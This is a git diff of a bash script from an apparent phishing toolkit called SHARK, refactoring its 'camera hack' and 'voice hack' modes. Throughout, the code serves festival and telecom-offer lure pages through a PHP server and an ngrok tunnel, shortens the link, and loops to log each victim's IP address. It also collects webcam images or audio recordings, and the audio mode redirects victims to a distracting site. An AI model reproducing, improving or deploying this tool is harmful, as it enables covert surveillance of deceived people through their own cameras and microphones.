@@ -304,89 +304,70 @@ function url_shortner() {
 function camera_hack() {
 clear && printf "\n\n"
 printf "$green >>> ${white}Choose Your Tempelates\n\n"
-printf "$yellow [ 1 ] ${white}Diwali \n\n"
-printf "$yellow [ 2 ] ${white}Freindship Dare \n\n"
-printf "$yellow [ 3 ] ${white}Freindship Day \n\n"
-printf "$yellow [ 4 ] ${white}New Year \n\n"
-printf "$yellow [ 5 ] ${white}Jio Offfer \n\n"
+printf "$yellow [ 1 ] ${white}Diwali \n\n";printf "$yellow [ 2 ] ${white}Freindship Dare \n\n";printf "$yellow [ 3 ] ${white}Freindship Day \n\n";printf "$yellow [ 4 ] ${white}New Year \n\n";printf "$yellow [ 5 ] ${white}Jio Offfer \n\n"
 read -p $'$green >>> ${white} Enter Your Choice : \n\n' page
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 case $page in
 1)
-			   if [ $page = 1 ]
-			   then 
-			   link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-                           sed 's+forwarding_link+'$link'+g' diwali.html > index2.html
-                           sed 's+forwarding_link+'$link'+g' template.php > index.php
-		           elif [ $page = 2 ]
-		           then 
-		           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-		           sed 's+forwarding_link+'$link'+g' freindship_dare.html > index2.html
-			   sed 's+forwarding_link+'$link'+g' template.php > index.php
-			   elif [ $page = 3 ]
-			   then 
-			   link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-			   sed 's+forwarding_link+'$link'+g' freinship_day.html > index2.html
-			   sed 's+forwarding_link+'$link'+g' template.php > index.php
-			   elif [ $page = 4 ]
-			   then 
-			   link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-			   sed 's+forwarding_link+'$link'+g' happy_new_year.html > index2.html
-			   sed 's+forwarding_link+'$link'+g' template.php > index.php
-			   elif [ $page = 5 ]
-			   then 
-			   link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-			   sed 's+forwarding_link+'$link'+g' jio_offer.html > index2.html
-			   sed 's+forwarding_link+'$link'+g' template.php > index.php
-			   fi
-			   echo
-			   connection
-                           ( sleep 5 ) &> /dev/null & spin_shark
-                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
-                           sleep 1
-                           echo 
-                           (sleep 6) &> /dev/null & spin
-			   echo
-			   tput civis
-                           ngrok http 4444 > /dev/null 2>&1 &
-                           ( sleep 18 ) &> /dev/null & spinner
-                           echo 
-			   tput cnorm
-                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                          
-			   ( sleep 6 ) &> /dev/null & spinner1
-		           url_shortner
-			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
-			   clear
-			   shark_logo
-			   echo 
-			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
-			   echo 
-			   echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
-                           echo
+   source="diwali.html"
+   ;;
+2)
+   source="freindship_dare.html"
+   ;;
+3)
+   source="freinship_day.html"
+   ;;
+4) 
+   source="happy_new_year.html"
+   ;;
+5)
+   source="jio_offer.html"
+   ;;
+   
+esac
+
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+sed 's+forwarding_link+'$link'+g' ${source} > index2.html;sed 's+forwarding_link+'$link'+g' template.php > index.php
 			   while [ true ]; do
                            if [[ -e "ip.txt" ]]; then
-			   printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
-			   echo
-			   catch_ip
-			   rm -rf ip.txt
+			   printf "\n${green}[${white}+${green}] Victim opened the link!\n\n"
+			   catch_ip && rm -rf ip.txt
 			   fi
 			   sleep 0.5
 		           if [[ -e "Log.log" ]]; then
-			   printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
-			   rm -rf Log.log
+			   printf "\n${green}[${white}+${green}] Cam file received!\n\n" && rm -rf Log.log
 			   fi
 			   sleep 0.5
 			   mv cam* ${files}/Camera_hack >> /dev/null 2>&1 
 			   done
 }
 
+# Voice Hack
 
+function audio_hack() {
+default_redirect="https://www.youtube.com/channel/UCMhYgk0-nIHHtnRNkL9zpgQ/about"
+printf "${green}[${white}+${green}] Choose a distracting website ${white}(Default: https://youtube.com )" $default_redirect && read redirect_link
+redirect_link="${redirect_link:-${default_redirect}}";link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+sed 's+forwarding_link+'$link'+g' template.php > index.php;sed 's+redirect_link+'$redirect_link'+g' js/_app.js > js/app.js
+while [ true ]; do
+                            if [[ -e "ip.txt" ]]; then
+		 	    printf "\n${green}[${white}+${green}] Victim opened the link!\n\n"
+			    catch_ip && rm -rf ip.txt			    
+			    fi
+			    sleep 0.5
+		            if [[ -e "Log.log" ]]; then
+			    printf "\n${green}[${white}+${green}] Cam file received!\n\n" && rm -rf Log.log			   
+			    fi
+			    sleep 0.5
+			    mv 20* ${files}/Audio_hack >> /dev/null 2>&1 
+			    done
+
+}
 
 # MAIN 
 function main() {
         launch="starting shark server";splashdown="started shark server";printf "\n";connection;php -S 127.0.0.1:4444 > /dev/null 2>&1 & sleep 2;ngrok http 4444 > /dev/null 2>&1 & sleep 20 & spinner;link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io");url_shortner;
 }
-
 
 while :
 do
@@ -625,154 +606,23 @@ banner
 	          then        
 		  
 		           cd $php/Camera_hack && main && file_check
-			   echo
-			   clear
-			   echo
-			   echo -e "\e[1;32m >>> \e[1;93mChoose Your Tempelates\e[m"
-			   echo
-			   echo -e "\e[1;31m[\e[0m\e[1;77m 1 \e[0m\e[1;31m]\e[0m\e[1;32m Diwali \e[0m" 
-			   echo
-			   echo -e "\e[1;31m[\e[0m\e[1;77m 2 \e[0m\e[1;31m]\e[0m\e[1;32m Freinship Dare\e[0m" 
-			   echo
-			   echo -e "\e[1;31m[\e[0m\e[1;77m 3 \e[0m\e[1;31m]\e[0m\e[1;32m Freindship Day \e[0m"
-			   echo
-			   echo -e "\e[1;31m[\e[0m\e[1;77m 4 \e[0m\e[1;31m]\e[0m\e[1;32m Happy New Year \e[0m" 
-			   echo
-			   echo -e "\e[1;31m[\e[0m\e[1;77m 5 \e[0m\e[1;31m]\e[0m\e[1;32m Jio Offer \e[0m"
-			   echo
-			   read -p $'\e[1;91m[\e[0m\e[1;92m >>> \e[0m\e[1;91m]\e[0m\e[1;93m Enter Your Choice : \e[0m' page
-			   if [ $page = 1 ]
-			   then 
-			   link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-                           sed 's+forwarding_link+'$link'+g' diwali.html > index2.html
-                           sed 's+forwarding_link+'$link'+g' template.php > index.php
-		           elif [ $page = 2 ]
-		           then 
-		           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-		           sed 's+forwarding_link+'$link'+g' freindship_dare.html > index2.html
-			   sed 's+forwarding_link+'$link'+g' template.php > index.php
-			   elif [ $page = 3 ]
-			   then 
-			   link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-			   sed 's+forwarding_link+'$link'+g' freinship_day.html > index2.html
-			   sed 's+forwarding_link+'$link'+g' template.php > index.php
-			   elif [ $page = 4 ]
-			   then 
-			   link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-			   sed 's+forwarding_link+'$link'+g' happy_new_year.html > index2.html
-			   sed 's+forwarding_link+'$link'+g' template.php > index.php
-			   elif [ $page = 5 ]
-			   then 
-			   link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-			   sed 's+forwarding_link+'$link'+g' jio_offer.html > index2.html
-			   sed 's+forwarding_link+'$link'+g' template.php > index.php
-			   fi
-			   echo
-			   connection
-                           ( sleep 5 ) &> /dev/null & spin_shark
-                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
-                           sleep 1
-                           echo 
-                           (sleep 6) &> /dev/null & spin
-			   echo
-			   tput civis
-                           ngrok http 4444 > /dev/null 2>&1 &
-                           ( sleep 18 ) &> /dev/null & spinner
-                           echo 
-			   tput cnorm
-                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                          
-			   ( sleep 6 ) &> /dev/null & spinner1
-		           url_shortner
-			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
-			   clear
-			   shark_logo
-			   echo 
-			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
-			   echo 
-			   echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
-                           echo
-			   while [ true ]; do
-                           if [[ -e "ip.txt" ]]; then
-			   printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
-			   echo
-			   catch_ip
-			   rm -rf ip.txt
-			   fi
-			   sleep 0.5
-		           if [[ -e "Log.log" ]]; then
-			   printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
-			   rm -rf Log.log
-			   fi
-			   sleep 0.5
-			   mv cam* ${files}/Camera_hack >> /dev/null 2>&1 
-			   done
-			   
+			   camera_hack
 			   break;
 			   
 	           elif [ $option = 32 ]
 	           then 
 		            cd $php/Audio_hack && main && file_check
-			    echo
-			    default_redirect="https://www.youtube.com/channel/UCMhYgk0-nIHHtnRNkL9zpgQ/about"
-                            printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a distracting website (Default:\e[0m\e[1;77m https://youtube.com\e[0m\e[1;92m ): \e[0m" $default_redirect
-                            read redirect_link
-                            redirect_link="${redirect_link:-${default_redirect}}"
-			    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-			    sed 's+forwarding_link+'$link'+g' template.php > index.php
-			    sed 's+redirect_link+'$redirect_link'+g' js/_app.js > js/app.js
-			    echo
-			    connection
-                            ( sleep 5 ) &> /dev/null & spin_shark
-                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
-                            sleep 1
-                            echo 
-                            (sleep 6) &> /dev/null & spin
-			    echo
-			     tput civis
-                            ngrok http 4444 > /dev/null 2>&1 &
-                            ( sleep 18 ) &> /dev/null & spinner
-                             echo 
-			    tput cnorm
-                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                          
-			    ( sleep 6 ) &> /dev/null & spinner1
-		            url_shortner
-			    read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
-			    clear
-			    shark_logo
-			    echo 
-			    echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
-			    echo 
-			    echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
-                            echo
-		            while [ true ]; do
-                            if [[ -e "ip.txt" ]]; then
-		 	    printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
-			    echo
-			    catch_ip
-			    rm -rf ip.txt
-			    fi
-			    sleep 0.5
-		            if [[ -e "Log.log" ]]; then
-			    printf "\n\e[1;92m[\e[0m+\e[1;92m] Audio received!\e[0m\n"
-			    rm -rf Log.log
-			    fi
-			    sleep 0.5
-			    mv 20* ${files}/Audio_hack >> /dev/null 2>&1 
-			    done
-			   
+			    audio_hack
 		            break;
 			   
 	          elif [ $option = 99 ]
-	          then     
-		      echo
-		      exit 
+	          then
+		      printf "\n" && exit 
 		      break;
 		      
                   else 
-		  
-		  echo
-		  echo -e "\e[92m[\e[94m!\e[92m]\e[91m Invalid option Try Again !! \e[m "
-		  sleep 2
+		  printf "\n${green}[${yellow}!${green}${red} Invalid option Try Again !!${white}\n"
+		  sleep 0.8
 		  fi
                   done
 		  
